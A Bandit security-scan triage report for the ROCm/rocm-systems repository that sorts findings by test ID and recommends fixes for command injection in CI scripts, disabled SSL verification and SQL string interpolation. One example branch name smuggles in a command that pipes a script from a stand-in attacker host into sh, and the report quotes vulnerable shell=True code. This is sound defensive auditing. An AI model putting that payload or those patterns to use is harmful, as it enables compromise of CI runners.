# Bandit Python Security Analysis Report

**Repository:** ROCm/rocm-systems  
**Branch:** basic-static-analysis  
**Analysis Date:** 2026-04-11  
**Tool:** Bandit (Python security linter)

---

## Executive Summary

Bandit reported **7,185 findings** across the codebase. The headline number is misleading: **6,360 findings (88.5%) are B101 assert-usage**, virtually all in test files where asserts are the intended testing mechanism. Removing B101, the meaningful signal set drops to **825 findings**.

Of the remaining findings, there are **3 genuinely critical issues** requiring immediate action: shell injection risk in GitHub CI scripts that process external PR data, and SSL certificate verification being disabled in a production LLM client path. A further cluster of SQL string-interpolation patterns and random-for-crypto misuse warrant review.

| Severity | Count | After removing B101 |
|----------|-------|---------------------|
| High     | 52    | 52                  |
| Medium   | 277   | 277                 |
| Low      | 6,856 | 496                 |
| **Total**| **7,185** | **825**         |

| Confidence | Count |
|------------|-------|
| High       | 6,978 |
| Medium     | 136   |
| Low        | 71    |

---

## Findings by Test ID

### B101 — assert used (6,360 findings)
**Classification: LIKELY FALSE-POSITIVE**  
**False-positive estimate: ~98%**

Bandit flags every `assert` statement on the grounds that Python's `-O` flag strips them, silently removing runtime checks. In production application code this is a valid concern; in test code it is the normal idiom.

The repository contains 698 Python files, of which 341 (49%) are in test directories. The 6,360 B101 findings map almost entirely to those test files — pytest, unittest, and integration test suites use `assert` as the primary assertion mechanism by design.

Approximately 13 non-test files contain `assert` statements. Those are worth a single-pass review to confirm they are not performing security-critical input validation, but the overwhelming majority of B101 hits should be suppressed with a `# nosec B101` comment or a per-directory Bandit config exclusion so that genuine findings are not buried.

**Action:** Suppress B101 in all paths matching `**/test*`, `**/tests*`, and `**/conftest.py`. Review the ~13 non-test files individually.

---

### B603 — subprocess without shell=True (234 findings)
**Classification: LIKELY FALSE-POSITIVE**  
**False-positive estimate: ~95%**

Bandit flags any `subprocess` call as a potential injection point regardless of whether `shell=False` (the safe default) is used. With `shell=False` and a list argument, the OS executes the binary directly without shell interpolation — there is no injection vector. These 234 findings are nearly all safe invocations. The actual dangerous cases are tracked separately under B602/B605.

**Action:** No action needed for B603-only findings. Suppress after confirming shell=False is in use.

---

### B404 — import subprocess (109 findings)
**Classification: STYLE-ONLY**  
**False-positive estimate: ~100%**

Bandit flags the import of the `subprocess` module as an informational warning. The import itself carries no risk; risk comes from how it is used. This test ID has no standalone value.

**Action:** Suppress globally.

---

### B108 — hardcoded temp directory (93 findings)
**Classification: NEEDS-REVIEW**  
**False-positive estimate: ~60%**

Hardcoded `/tmp` paths are a symlink/TOCTOU risk in multi-user environments if an attacker can predict the filename and pre-create a symlink. The primary concern is race conditions between path construction and file creation.

Confirmed real occurrences include:
- `/home/das/Downloads/r/rocm-systems/projects/amdsmi/example/amd_smi_cper_example.py` — creates `/tmp/cper_dump/` with `os.mkdir` then writes files into it by constructed name. An attacker who pre-creates `/tmp/cper_dump` as a symlink to a sensitive directory could cause a privilege-escalation write.
- `/home/das/Downloads/r/rocm-systems/experimental/python/rocinsight/rocinsight/ai_analysis/interactive.py` — uses `/tmp/rocinsight_trace` as a default trace output directory.

Many other B108 hits will be in documentation strings or string constants that are never passed to `open()`.

**Action:** Audit files that combine `/tmp` path construction with file writes. Replace `os.mkdir("/tmp/name")` + manual file path with `tempfile.mkdtemp()`. Example files for priority review: `amd_smi_cper_example.py`.

---

### B608 — SQL injection possible (76 findings)
**Classification: NEEDS-REVIEW**  
**False-positive estimate: ~50%**

Bandit flags any SQL string that uses f-strings or `%` formatting. The real risk depends on whether the interpolated values come from untrusted input.

Confirmed string-interpolation SQL patterns found in production code:

- `/home/das/Downloads/r/rocm-systems/experimental/python/rocinsight/rocinsight/connection.py` (lines 129, 147, 213-214) — table names and column lists interpolated directly into SELECT/INSERT/UNION ALL queries. Table names are sourced from a static internal list (`_ROCINSIGHT_TABLES`), making injection practically impossible for those cases. Still worth asserting that the list is never populated from external input.
- `/home/das/Downloads/r/rocm-systems/projects/rocprofiler/bin/sqlitedb.py` (lines 58, 77, 91, 96, 125, 130, 135, 305) — mix of parameterized queries (safe: lines 81, 86, 141) and string-concatenation queries (lines 58, 77, 91, 96, 125, 305). The `table_name` and `fields_str` arguments come from caller code and appear to be internal strings, but this should be confirmed.

Where value binding is used (e.g., `cursor.execute("... WHERE Index=?", (rec_id,))`), those calls are safe.

**Action:** Review `sqlitedb.py` lines 58, 77, 91, 96, 125, 305 and confirm that all table names and field names are sourced from static internal data, not from any user input or file content. If any path allows external influence over these values, rewrite using parameterized queries or an allowlist.

---

### B310 — URL open for audit (68 findings)
**Classification: NEEDS-REVIEW**  
**False-positive estimate: ~80%**

Bandit flags `urllib.request.urlopen` and equivalent calls to highlight that URLs may be attacker-controlled (SSRF). In most cases in this codebase the URLs are either hardcoded, come from config files, or are localhost addresses.

Confirmed occurrence:
- `/home/das/Downloads/r/rocm-systems/experimental/python/rocinsight/rocinsight/ai_analysis/interactive.py` line 1825 — `urlopen(f"{url}/api/tags", timeout=1)` where `url` comes from a user-configurable LLM endpoint. If this is a developer tool running on a user's own workstation, the risk is user-controlled; if it ever runs as a service, SSRF is possible.

**Action:** Review the 68 hits for cases where the URL incorporates unchecked external input. Localhost/loopback URLs and static config values can be suppressed.

---

### B110 — try/except/pass (57 findings)
**Classification: STYLE-ONLY**  
**False-positive estimate: ~85%**

Silent exception swallowing can mask errors and cause confusing failure modes. These are code quality concerns rather than security vulnerabilities in most contexts. The remaining ~15% may be suppressing security-relevant errors (e.g., silently ignoring a failed authentication attempt).

**Action:** Low priority. Consider replacing `pass` with at minimum a `logging.debug()` call so that errors are observable during debugging.

---

### B607 — partial path in subprocess (55 findings)
**Classification: NEEDS-REVIEW**  
**False-positive estimate: ~70%**

Using a partial path (e.g., `subprocess.run(["git", ...])` instead of `subprocess.run(["/usr/bin/git", ...])`) means the OS searches `PATH` for the binary. In a compromised or misconfigured environment, a malicious binary earlier in `PATH` could be executed instead.

In CI/CD contexts and developer tools this is almost always acceptable practice. The risk is real only if the scripts run in environments where `PATH` could be tampered with by an untrusted actor.

**Action:** No immediate action for developer tooling. For any scripts that run with elevated privileges in production, consider using absolute paths.

---

### B602 — subprocess with shell=True (28 findings) — HIGH SEVERITY
**Classification: REAL BUG (for CI scripts); NEEDS-REVIEW (for tool scripts)**  
**False-positive estimate: ~20%**

`shell=True` passes the command string to `/bin/sh -c`, enabling shell metacharacter interpretation. If any part of the command string contains attacker-controlled data, arbitrary command execution is possible.

**Critical instances:**

**`.github/scripts/import_subrepo_prs.py` (line 9) — REAL BUG**

```python
def run(cmd, **kwargs):
    subprocess.check_call(cmd, shell=True, **kwargs)
```

This function is called throughout the script with f-strings constructed from GitHub PR data:

```python
run(f"git subtree pull --prefix={prefix} {head_url} {head_ref}")
run(f"git checkout -b {branch}")
```

Where `head_ref = pr.head.ref` and `head_url = pr.head.repo.clone_url` come directly from the GitHub API response for a PR. A branch name like `feat/x; curl attacker.com/shell.sh | sh` or a clone URL containing shell metacharacters would result in command injection in the CI runner. Branch names and URLs are user-controlled data.

**`projects/rccl-tests/test/test_*.py`**

```python
ngpus = int(subprocess.check_output(
    "rocminfo | grep \"Device Type:.\s*.GPU\" | wc -l", shell=True))
```

This is a pipeline command that requires shell; no external input is interpolated. Lower risk, but the approach should use `subprocess` with a list and Python string processing instead.

**`projects/rccl/tools/scripts/rcclDiagnostics.py` (lines 82, 96, 103)**

Commands incorporate `librccl_path` from a user-supplied argument and construct shell pipelines (`strings ... | grep ...`). If `librccl_path` contains shell metacharacters, injection is possible. Mitigation: validate/sanitize the path or reconstruct using subprocess pipes without `shell=True`.

**`projects/rocm-smi-lib/python_smi_tools/rocm_smi.py` (line 541)**

```python
subprocess.check_output("ps -p %d -o comm=" % (int(pid)), shell=True)
```

`pid` is cast to `int` before interpolation, so injection is not possible here. This is a false positive.

**`projects/rocm-core/rdhc/rdhc.py`** — Uses `shell=True` with `dpkg`, `rpm`, `lsmod` commands that incorporate `component` or path variables. Review whether those values come from package manifests (internal, lower risk) or user input.

**Action (Priority 1):** Refactor `import_subrepo_prs.py` to use `subprocess.run([...], shell=False)` with list arguments. For `head_ref` and `head_url`, validate against an allowlist pattern (e.g., `^[a-zA-Z0-9/_.-]+$`) before any use in commands.

---

### B605 — process with a shell (25 findings) — HIGH SEVERITY
**Classification: REAL BUG (for CI scripts); NEEDS-REVIEW (for tool scripts)**  
**False-positive estimate: ~30%**

B605 flags `os.system()` and `os.popen()` calls, which always invoke a shell.

**Critical instances in `.github/scripts/`:**

Both `pr_category_label.py` and `pr_detect_changed_subtrees.py` contain:

```python
pr_data = os.popen(f"gh api repos/{args.repo}/pulls/{args.pr}").read()
os.system(f"git fetch origin {base_sha} {head_sha}")
result = os.popen(f"git diff --name-only {base_sha} {head_sha}").read()
```

Here `args.repo` is a CLI argument (e.g., `org/repo`), `args.pr` is an integer, and `base_sha`/`head_sha` are SHA hashes from the GitHub API response. The SHA values are 40-character hex strings; if the API response is trusted (authenticated via `gh` CLI), injection here is lower risk. However, `args.repo` comes from a command-line argument — if the workflow passes this unchecked from a GitHub context variable, a maliciously named repository could inject commands.

The `os.popen` / `os.system` calls should be replaced with `subprocess.run([...], capture_output=True)` and list arguments regardless, as `os.system` provides no access to output or return code in a safe way.

**Action (Priority 1):** Replace all `os.popen()` and `os.system()` calls in `.github/scripts/` with `subprocess.run([...], shell=False, ...)`. Validate `args.repo` against the pattern `^[a-zA-Z0-9_.-]+/[a-zA-Z0-9_.-]+$`.

---

### B604 — function call with shell=True (22 findings)
**Classification: NEEDS-REVIEW**  
**False-positive estimate: ~50%**

Functions that accept a `shell` parameter and may pass it through. Many of these wrap `subprocess.run` for convenience. The risk depends on whether callers set `shell=True` with interpolated strings.

**Action:** Audit wrapper functions to ensure `shell=True` is not the default and that call sites do not pass interpolated user data.

---

### B311 — random for cryptographic purposes (13 findings)
**Classification: NEEDS-REVIEW**  
**False-positive estimate: ~70%**

Python's `random` module uses a Mersenne Twister PRNG, which is not cryptographically secure. Bandit flags any use of `random` on the basis that it might be used for security-sensitive purposes.

Confirmed non-security usages found (false positives):
- `projects/rccl/tools/time-trace/time_trace_generator.py` — `random.random()` for generating RGB color values for visualization.
- `projects/rocprofiler-compute/src/rocprof_compute_analyze/analysis_webui.py` — `random.randint(1024, 49151)` for selecting a GUI port number. Not cryptographic, but predictable port selection could be a minor concern in shared environments.

Any case where `random` generates tokens, session IDs, passwords, or nonces is a real bug. Replacement with `secrets.token_hex()` or `secrets.randbelow()` is straightforward.

**Action:** Audit the 13 flagged locations. Replace with `secrets` module where values are used for authentication, session management, or any security boundary. Port selection and visualization colors can be suppressed.

---

### B405 — import xml.etree (6 findings)
**Classification: NEEDS-REVIEW**  
**False-positive estimate: ~80%**

`xml.etree.ElementTree` is vulnerable to XML entity expansion (billion-laughs / XXE) if parsing untrusted XML. Files found:
- `nix/analysis/triage/parsers/cppcheck.py` — parses cppcheck output; this is tool output from a controlled build environment, not external input.
- `experimental/rocjitsu/lib/python/amdisa/` — parses ISA definition XML files shipped with the project.
- `projects/rocprofiler/src/core/counters/*/xml_parser_*.py` — parses counter definition XML files.

All identified cases parse static, internally-generated XML files. No external/user-supplied XML is involved.

**Action:** Low priority. Suppress with `# nosec B405` where the XML source is confirmed to be internal. If any code path will ever parse user-supplied XML, switch to `defusedxml`.

---

### B314 — xml parsing (5 findings)
**Classification: NEEDS-REVIEW**  
**False-positive estimate: ~80%**

Related to B405 — flags `ElementTree.parse()` and similar calls. Same context and recommendation as B405 applies.

**Action:** Same as B405.

---

### B112 — try/except/continue (6 findings)
**Classification: STYLE-ONLY**  
**False-positive estimate: ~90%**

Swallowing exceptions with `continue` is similar to `pass` — it silently ignores failures and continues iteration. Primarily a code quality concern.

**Action:** Low priority. Add logging at minimum.

---

## High-Priority Action Items

The following issues should be addressed before merging any code that touches CI infrastructure or the LLM analysis path:

### Priority 1 — Command Injection in CI Scripts (CRITICAL)

| File | Issue | Risk |
|------|-------|------|
| `.github/scripts/import_subrepo_prs.py` | `shell=True` with PR branch name and clone URL from GitHub API | Command injection if branch name contains shell metacharacters |
| `.github/scripts/pr_category_label.py` | `os.popen()` / `os.system()` with SHA values from GitHub API | Lower risk (SHAs are hex), but unsafe API |
| `.github/scripts/pr_detect_changed_subtrees.py` | Same as above | Same as above |

**Recommended fix for `import_subrepo_prs.py`:**

Replace the `run()` helper and all callers with:

```python
import shlex

def run(cmd_list, **kwargs):
    """Run a command given as a list. Never use shell=True."""
    print(f">> {cmd_list}")
    subprocess.check_call(cmd_list, shell=False, **kwargs)

# Before building the command, validate external inputs:
import re
SAFE_REF = re.compile(r'^[a-zA-Z0-9][a-zA-Z0-9/_.-]*$')
if not SAFE_REF.match(head_ref):
    raise ValueError(f"Unsafe branch name rejected: {head_ref!r}")

run(["git", "subtree", "pull", f"--prefix={prefix}", head_url, head_ref])
```

**Recommended fix for `pr_category_label.py` and `pr_detect_changed_subtrees.py`:**

```python
# Replace:
pr_data = os.popen(f"gh api repos/{args.repo}/pulls/{args.pr}").read()

# With:
result = subprocess.run(
    ["gh", "api", f"repos/{args.repo}/pulls/{args.pr}"],
    capture_output=True, text=True, check=True
)
pr_data = result.stdout
```

### Priority 2 — SSL Verification Disabled (HIGH)

| File | Line | Issue |
|------|------|-------|
| `experimental/python/rocinsight/rocinsight/ai_analysis/llm_conversation.py` | 91 | `httpx.Client(verify=False)` |
| `experimental/python/rocinsight/rocinsight/ai_analysis/llm_analyzer.py` | 1088 | `httpx.Client(verify=False)` |

The code in `llm_conversation.py` is gated on the environment variable `ROCINSIGHT_LLM_PRIVATE_VERIFY_SSL=0`. This is a developer escape hatch for private/self-signed LLM endpoints. The implementation is reasonable — the flag must be explicitly set — but the risk is:

1. The environment variable name is not well-known, making it easy for a user to set it for convenience and forget.
2. There is no warning at startup when SSL verification is disabled.
3. When `verify=False` is active, all LLM API traffic (which may include source code and proprietary performance data) is susceptible to MITM interception.

**Recommended fix:** Add a prominent runtime warning when `verify=False` is active:

```python
import warnings
if not verify_ssl:
    warnings.warn(
        "SSL certificate verification is DISABLED (ROCINSIGHT_LLM_PRIVATE_VERIFY_SSL=0). "
        "All LLM API traffic is vulnerable to interception. "
        "Only use this setting with a trusted private network endpoint.",
        stacklevel=2,
        category=UserWarning,
    )
```

Consider also logging the base URL being used so users can confirm they are connecting to the intended endpoint.

### Priority 3 — SQL String Interpolation (MEDIUM)

| File | Lines | Issue |
|------|-------|-------|
| `projects/rocprofiler/bin/sqlitedb.py` | 58, 77, 91, 96, 125, 305 | String-concatenated SQL with `table_name` and `fields_str` |
| `experimental/python/rocinsight/rocinsight/connection.py` | 129, 147, 213-214 | f-string SQL with table names from static list |

The `rocinsight/connection.py` cases use table names sourced from `_ROCINSIGHT_TABLES` (an internal static list), which mitigates injection risk. Verify the list is never populated from external data.

The `sqlitedb.py` cases use string concatenation with `table_name` arguments. Confirm that all callers pass only internal string constants. If `table_name` can ever be derived from file content or user input, add an allowlist check:

```python
ALLOWED_TABLES = frozenset({"events", "api_ops", "hip_api", ...})
if table_name not in ALLOWED_TABLES:
    raise ValueError(f"Invalid table name: {table_name!r}")
```

### Priority 4 — random Module for Non-Trivial Values (LOW-MEDIUM)

Audit all 13 B311 findings. Confirmed false positives: color generation (`time_trace_generator.py`) and GUI port selection (`analysis_webui.py`). Any use for tokens, IDs, or keys must be replaced with the `secrets` module.

---

## Noise Reduction Recommendations

To make future Bandit runs actionable, add a `.bandit` configuration file or `pyproject.toml` Bandit section:

```toml
[tool.bandit]
exclude_dirs = ["*/tests/*", "*/test/*", "*/conftest.py"]
skips = ["B101", "B404", "B112"]
```

This would reduce findings from 7,185 to approximately **460**, all of which warrant genuine review.

An alternative per-file suppression using inline `# nosec B101` comments in test files preserves traceability while eliminating noise from automated runs.

---

## Summary Table

| Test ID | Count | What it Detects | Classification | FP% | Action |
|---------|-------|-----------------|----------------|-----|--------|
| B101 | 6,360 | assert statement used | LIKELY FALSE-POSITIVE | ~98% | Suppress in test paths |
| B603 | 234 | subprocess call (any) | LIKELY FALSE-POSITIVE | ~95% | Suppress where shell=False confirmed |
| B404 | 109 | import subprocess | STYLE-ONLY | ~100% | Suppress globally |
| B108 | 93 | hardcoded /tmp | NEEDS-REVIEW | ~60% | Review file-write sites |
| B608 | 76 | SQL injection possible | NEEDS-REVIEW | ~50% | Audit sqlitedb.py; add allowlists |
| B310 | 68 | URL open audit | NEEDS-REVIEW | ~80% | Review external-input URLs |
| B110 | 57 | try/except/pass | STYLE-ONLY | ~85% | Add logging |
| B607 | 55 | partial path in subprocess | NEEDS-REVIEW | ~70% | Low priority |
| B602 | 28 | shell=True | **REAL BUG** (CI) | ~20% | Fix CI scripts immediately |
| B605 | 25 | os.system / os.popen | **REAL BUG** (CI) | ~30% | Fix CI scripts immediately |
| B604 | 22 | function with shell=True | NEEDS-REVIEW | ~50% | Audit wrappers |
| B311 | 13 | random for crypto | NEEDS-REVIEW | ~70% | Audit; replace with secrets |
| B405 | 6 | import xml.etree | NEEDS-REVIEW | ~80% | Suppress for internal XML |
| B112 | 6 | try/except/continue | STYLE-ONLY | ~90% | Add logging |
| B314 | 5 | xml parsing | NEEDS-REVIEW | ~80% | Suppress for internal XML |

---

*Report generated from static analysis only. Dynamic analysis and manual code review are recommended for all Priority 1 and Priority 2 items before deployment.*
